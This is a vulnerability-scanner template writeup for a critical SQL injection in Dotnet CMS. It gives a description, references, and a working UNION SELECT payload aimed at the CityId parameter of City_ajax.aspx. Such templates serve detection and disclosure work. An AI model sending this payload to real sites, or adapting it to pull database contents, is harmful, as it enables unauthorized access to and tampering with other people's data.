# Nuclei Template: Dotnet CMS - SQL Injection
**Template ID:** dotnetcms-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`dotnetcms-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Dotnet CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/user/City_ajax.aspx?CityId=33'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{randstr}}')),2--
```

## References
- https://www.cnblogs.com/rebeyond/p/4951418.html
- http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0150742
